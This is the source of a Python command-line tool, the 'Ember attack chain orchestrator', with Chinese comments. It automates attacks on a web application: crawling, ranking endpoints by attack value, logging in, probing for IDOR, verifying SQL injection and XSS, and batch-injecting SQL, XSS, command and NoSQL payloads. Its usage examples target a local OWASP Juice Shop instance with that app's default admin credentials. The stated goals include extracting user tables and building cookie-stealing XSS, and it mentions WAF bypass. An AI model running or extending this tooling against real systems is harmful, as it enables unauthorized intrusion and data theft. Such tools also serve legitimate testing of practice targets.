#!/usr/bin/env python3
"""
Ember 攻击链编排器 — 多步自动化攻击。

典型链:
  1. Spider → 发现端点
  2. Session.login() → 获取认证
  3. Analyzer → 验证漏洞
  4. WAF → 绕过变形
  5. Exploit → 数据提取

内置攻击链模板:
  - login-scan:    登录 → 扫描所有认证后端点 → 测 IDOR
  - sqli-extract:  发现注入点 → 联合查询 → 提取用户表
  - xss-chain:     发现反射 → 构造窃取 cookie payload
  - full-chain:    以上全部 + HTML 报告

用法:
  python3 web/chain.py -t http://localhost:3000 --chain full-chain
  python3 web/chain.py -t http://localhost:3000 --chain login-scan \
    --login /rest/user/login --creds '{"email":"admin@juice-sh.op","password":"admin123"}'
"""

import json, sys, time, os
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# 本地导入
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from web.spider import Spider
from web.session import SessionManager
from web.analyzer import ResponseAnalyzer
from web.waf import WAFBypass
from payloads.engine import WebAttacker, PAYLOADS


# ═══════════════════════════════════════════════════════════════════════
# 内置攻击链
# ═══════════════════════════════════════════════════════════════════════

class AttackChain:
    """多步攻击编排器."""

    def __init__(self, target: str, timeout: int = 15):
        self.target = target
        self.spider = Spider(target, max_depth=2, max_pages=50)
        self.session = SessionManager(target, timeout=timeout)
        self.analyzer = ResponseAnalyzer(target, timeout=timeout)
        self.waf = WAFBypass()
        self.payload_engine = WebAttacker(target, timeout=timeout)
        self.report_data: List[Dict] = []
        self.chain_steps: List[str] = []

    def step(self, name: str):
        print(f"\n{'━'*60}\n  {name}\n{'━'*60}")
        self.chain_steps.append(name)

    # ── 攻击链 1: 爬虫 → 分类 → 优先级排序 ──
    def chain_recon(self) -> Dict:
        self.step("RECON: 自动爬虫 + 端点发现")
        report = self.spider.crawl()

        # 按攻击价值排序: POST > API > 带参数 > 静态
        eps = report.get("endpoints", [])
        scored = []
        for ep in eps:
            score = 0
            methods = ep.get("methods", [])
            if "POST" in methods: score += 3
            if "PUT" in methods or "DELETE" in methods: score += 2
            if "/api/" in ep["path"] or "/rest/" in ep["path"]: score += 2
            if ep.get("params"): score += 1
            if any(kw in ep["path"].lower() for kw in ["login","admin","user","order","upload"]): score += 1
            scored.append((score, ep))
        scored.sort(key=lambda x: -x[0])

        print(f"\n  Top 10 优先攻击目标:")
        for score, ep in scored[:10]:
            methods = "+".join(ep["methods"])
            print(f"  [{score}] {methods:<10s} {ep['path']}")

        self.report_data.append({"phase": "recon", **report})
        return report

    # ── 攻击链 2: 登录扫描 ──
    def chain_login_scan(self, login_path: str, creds: Dict,
                          login_type: str = "json") -> Dict:
        self.step(f"LOGIN-SCAN: 认证后 IDOR + 权限扫描")
        ok = False
        if login_type == "json":
            ok = self.session.try_login_json(login_path, creds)
        else:
            ok = self.session.try_login(login_path, creds)

        if not ok:
            return {"error": "登录失败"}

        # 打已知高危端点
        high_value = [
            "/api/user", "/api/users", "/rest/user/whoami",
            "/admin", "/api/admin", "/profile",
            "/api/orders", "/api/basket",
            "/users/me", "/sellers/me/withdrawals",
            "/users/me/data-export", "/users/me/account/deletion",
        ]
        findings = []
        for ep in high_value:
            status, body = self.session.get(ep)
            if status == 200 and len(body) > 50:
                findings.append({"endpoint": ep, "status": status,
                                 "body_len": len(body), "risk": "idor_risk"})

        print(f"  {len(findings)} 个潜在 IDOR 端点")
        for f in findings:
            print(f"  ⚠️ [{f['status']}] {f['endpoint']} ({f['body_len']} bytes)")

        self.report_data.append({"phase": "login-scan", "findings": findings})
        return {"authenticated": True, "findings": findings}

    # ── 攻击链 3: SQL 注入提取 ──
    def chain_sqli_extract(self, endpoints: List[Dict]) -> Dict:
        self.step(f"SQLi-EXTRACT: 联合查询提取数据")
        payload_eps = [ep["path"] for ep in endpoints if ep.get("params")]

        hits = []
        for path in payload_eps[:10]:
            param = endpoints[0].get("params", ["q"])[0] if endpoints else "q"
            result = self.analyzer.verify_sqli(path, param)
            if result["vulnerable"]:
                hits.append({"path": path, "param": param, **result})
                print(f"  ✅ [{result['confidence']}] {path}?{param}=PAYLOAD")

        print(f"\n  {len(hits)} 个 SQL 注入点")
        self.report_data.append({"phase": "sqli-extract", "hits": hits})
        return {"sqli_count": len(hits), "details": hits}

    # ── 攻击链 4: XSS 链 ──
    def chain_xss(self, endpoints: List[Dict]) -> Dict:
        self.step(f"XSS-CHAIN: 反射检测 + Cookie 窃取构造")
        payload_eps = [ep["path"] for ep in endpoints if ep.get("params")]

        hits = []
        for path in payload_eps[:10]:
            param = endpoints[0].get("params", ["q"])[0] if endpoints else "q"
            result = self.analyzer.verify_xss(path, param)
            if result["vulnerable"]:
                hits.append({"path": path, "param": param, **result})
                print(f"  ✅ XSS {path}")

        self.report_data.append({"phase": "xss", "hits": hits})
        return {"xss_count": len(hits), "details": hits}

    # ── 攻击链 5: 完整自动驾驶 ──
    def chain_full_auto(self, login_path: Optional[str] = None,
                        creds: Optional[Dict] = None) -> Dict:
        self.step("FULL-AUTO: 爬虫 → 登录 → 注入 → XSS → 报告")

        # 1. Recon
        recon = self.chain_recon()
        endpoints = recon.get("endpoints", [])

        # 2. Login
        if login_path and creds:
            self.chain_login_scan(login_path, creds)

        # 3. SQLi
        sqli_result = self.chain_sqli_extract(endpoints)

        # 4. XSS
        xss_result = self.chain_xss(endpoints)

        # 5. Payload injection
        self.step("PAYLOAD-INJECT: 9 类 payload 批量注射")
        payload_eps = [ep["path"] for ep in endpoints[:5] if ep.get("params")]
        all_payload_hits = []
        for cat in ["sqli", "xss", "cmdi", "nosql"]:
            results = self.payload_engine.probe_category(cat, payload_eps[:3])
            hits = [r for r in results if r["hit"]]
            if hits:
                all_payload_hits.extend(hits)
                print(f"  💣 {cat}: {len(hits)} hits")

        self.report_data.append({"phase": "payload-inject", "hits": all_payload_hits})

        # 汇总
        return {
            "recon": {"endpoints": len(endpoints)},
            "sqli": sqli_result.get("sqli_count", 0),
            "xss": xss_result.get("xss_count", 0),
            "payload_hits": len(all_payload_hits),
            "full_report": self.report_data,
        }


# ═══════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="Ember 攻击链编排器")
    ap.add_argument("-t", "--target", required=True)
    ap.add_argument("--chain", choices=["recon","login-scan","sqli-extract","xss","full-auto"], default="full-auto")
    ap.add_argument("--login", default=None)
    ap.add_argument("--creds", default=None, help='JSON: {"user":"admin","pass":"pass"}')
    ap.add_argument("-o", "--output", default=None)
    args = ap.parse_args()

    chain = AttackChain(args.target)

    if args.chain == "recon":
        result = chain.chain_recon()

    elif args.chain == "login-scan":
        if not args.login or not args.creds:
            sys.exit("需要 --login 和 --creds")
        creds = json.loads(args.creds)
        result = chain.chain_login_scan(args.login, creds)

    elif args.chain == "sqli-extract":
        report = chain.spider.crawl()
        result = chain.chain_sqli_extract(report.get("endpoints", []))

    elif args.chain == "xss":
        report = chain.spider.crawl()
        result = chain.chain_xss(report.get("endpoints", []))

    elif args.chain == "full-auto":
        creds = json.loads(args.creds) if args.creds else None
        result = chain.chain_full_auto(args.login, creds)

    print(f"\n{'═'*60}")
    print(f"攻击链完成: {len(chain.chain_steps)} 步")
    json.dump(result, sys.stdout, indent=2, ensure_ascii=False)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        print(f"📄 报告: {args.output}")
